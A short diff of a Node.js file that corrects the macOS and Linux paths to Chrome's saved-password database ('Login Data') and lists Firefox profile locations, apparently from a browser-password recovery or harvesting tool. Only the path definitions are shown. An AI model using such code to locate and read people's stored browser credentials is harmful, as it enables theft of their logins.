@@ -3,8 +3,8 @@ roaming = process.env.ROAMINGAPPDATA,
 p = require('path'),
 // Chrome Paths
 chrome_win = p.join(String(local),"Google","Chrome","User Data","Default","Login Data"),
-chrome_mac = "/User/",
-chrome_lin = "~/.config/google-chrome/Default/Login Data",
+chrome_mac = "Users/"+process.env.USER+"/Library/Application Support/Google/Chrome/Default",
+chrome_lin = "/home/" + process.env.USER + "/.config/google-chrome/Default/Login Data",
 // Firefox Paths
 fire_win = p.join(String(roaming),"Mozilla","Firefox","Profiles"),
 fire_mac = "",
